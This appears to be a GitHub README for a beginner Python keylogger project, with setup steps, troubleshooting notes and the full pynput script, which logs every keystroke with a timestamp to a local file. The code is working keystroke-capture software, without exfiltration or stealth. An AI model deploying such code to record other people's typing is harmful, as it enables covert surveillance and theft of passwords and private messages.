# Keylogger_Project

## Project Description

This project is a Python-based keylogger designed to capture keystrokes and store them in a local text file. It was created for learning and exploration purposes, and it demonstrates the use of libraries and logging functionality in Python.

## ⚠️ Disclaimer

This project is intended strictly for educational and testing purposes. Unauthorized or malicious use of this script for tracking keystrokes or other unauthorized activities may violate privacy laws and is strictly prohibited. By using this project, you agree to adhere to all applicable laws and use this code responsibly. The author does not endorse or condone the use of this script for any unlawful or unauthorized purposes.

## Learning Objectives

The goals for this project included:
   
   Building a functional keylogger script in Python.
   Understanding and resolving issues with virtual environments and package installations.
   Gaining familiarity with troubleshooting techniques in different development environments (WSL and native Windows).

## Prerequisites:

   - Python 3.10 or later
   - pynput package
   - Virtual environment setup (optional)

## Setup and Installation
  ### 1. Clone the repository:

    git clone https://github.com/yourusername/Keylogger_Project.git

  ### 2. Create a virtual environment:

    python3 -m venv keylogger_env

  ### 3. Activate the environment:

  ### For Windows:

      keylogger_env\Scripts\activate

  ### For WSL/Linux:

      source keylogger_env/bin/activate

  ### 4. Install dependencies:

      pip install pynput

## Usage

  1. Run the script:

    python3 keylogger_script.py

  2. Log files will be generated in the same directory as <keylogger_script.py>.


## Key Challenges and Solutions

During this project, several challenges were encountered and resolved:

   1. Issue: ModuleNotFoundError for pynput
        -Solution: Verified virtual environment installation and activated it correctly. Found that sudo bypassed the virtual environment, so permissions were managed without sudo.

   2. Environment-Specific Issues:
        -Problem: Script did not initially work on WSL.
        -Solution: Troubleshot environment by switching to a native Windows environment. This helped verify if WSL-specific permissions were the source of the issue.

   3. Permissions:
        -Solution: Adjusted file permissions in Ubuntu to ensure the script could write to the log file, especially when running without elevated permissions.

## Script Overview

This Python script listens for key presses and logs them to a file (`key_log.txt`). It uses the `pynput` library to capture key events and the `logging` module to record them with timestamps.

### How It Works:
  1. The script monitors all key presses and logs each key pressed to a log file.
  2. Special keys (like Shift, Ctrl, etc.) are also logged as "special key" presses.
  3. The script stops when the `Esc` key is pressed.

### Logging:
  - All key presses are logged in the `key_log.txt` file, with a timestamp of when each key was pressed.

python
    
    import logging
    from pynput import keyboard
    from datetime import datetime

    # Set up logging
    log_file_path = "key_log.txt"
    logging.basicConfig(filename=log_file_path, level=logging.DEBUG, format='%(asctime)s: %(message)s')

    def on_press(key):
      try:
          logging.info(f'Key {key.char} pressed')
      except AttributeError:
          logging.info(f'Special key {key} pressed')

    def on_release(key):
       if key == keyboard.Key.esc:
          return False  # Stop listener

    if __name__ == "__main__":
        print("Keylogger is running...")
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()


## Future Improvements

  - Error Handling: Add error handling for different environments.
  - Dynamic File Paths: Allow for customizable log file paths.
